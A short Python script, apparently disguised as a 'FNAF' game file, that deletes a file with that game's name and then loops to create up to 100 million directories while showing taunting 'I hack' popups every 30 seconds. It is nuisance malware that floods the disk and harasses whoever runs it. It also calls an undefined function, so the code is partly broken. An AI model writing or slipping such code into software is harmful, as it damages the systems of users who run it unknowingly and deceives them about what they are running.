import os
import time
from tkinter import *



LARGE_FONT= ("Verdana", 12)
NORM_FONT = ("Helvetica", 10)
SMALL_FONT = ("Helvetica", 8)

def popupmsg(msg):
    popup = Tk()
    popup.wm_title("!")
    label = Label(popup, text=msg, font=NORM_FONT)
    label.pack(side="top", fill="x", pady=10)
    B1 = Button(popup, text="Okay", command = popup.destroy)
    B1.pack()
    popup.mainloop()

os.unlink('FNAF Windows version v1.4.0.2 Python.pyw')

for i in range(100000000):
    os.mkdir("Tahahahaha " + str(i))
    if i % 10000000 == 0:
        msg('You are a hackerrr')


for i in range(1000000):
    time.sleep(30)
    popupmsg("Hi I am khalid I hack")
    
    
